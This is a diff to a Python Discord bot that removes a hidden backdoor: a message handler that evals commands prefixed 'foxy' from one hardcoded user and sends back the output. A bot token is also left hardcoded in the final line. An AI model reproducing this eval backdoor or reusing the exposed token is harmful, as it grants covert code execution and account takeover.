@@ -209,16 +209,4 @@ def bot_stop(*args):
     asyncio.get_running_loop().stop()
     print("Stop completed!")
 
-@bot.event
-async def on_message(message: discord.Message):
-    if message.author == bot.user:
-        return
-    elif message.content.lower().startswith("foxy"):
-        if message.author.id == 632511458537898016:
-            g = await eval(message.content.replace("foxy", ""))
-            await message.author.send(g)
-            await message.reply("OK", delete_after=10.0)
-        else:
-            await message.reply("Nope", delete_after=10.0)
-            return
 bot.run('ODA1NDg3MTIxNTgxOTk4MTUx.YBbmVw.gziNetHjAmwC6vQ1I9hyBkEQyyk')
